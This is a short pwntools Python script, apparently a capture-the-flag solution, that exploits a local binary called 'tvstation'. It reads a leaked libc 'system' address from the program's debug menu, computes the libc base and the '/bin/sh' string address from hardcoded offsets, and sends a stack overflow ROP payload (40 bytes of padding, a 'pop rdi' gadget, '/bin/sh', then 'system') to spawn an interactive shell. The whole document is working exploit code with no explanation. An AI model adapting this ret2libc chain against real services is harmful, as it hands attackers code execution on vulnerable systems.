from pwn import *


context(os="linux", arch="x86_64")

p = process("./bin/tvstation")

# gdb.attach(p,"""
# b debug_func
# c
# """)

# Get to debug menu
p.sendline("4")

# Make sure we capture system address
data = p.recvuntil("[Debug menu] enter cmd: ")

system_addr = int(data.split("system is @")[1].split("\n")[0], 16)

system_offset = 0x41490
binsh_offset = 0x163708

libc_base = system_addr - system_offset
binsh_addr = libc_base + binsh_offset

pop_rdi_ret = 0x22482 + libc_base

payload = ""
payload += "A" * 40
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
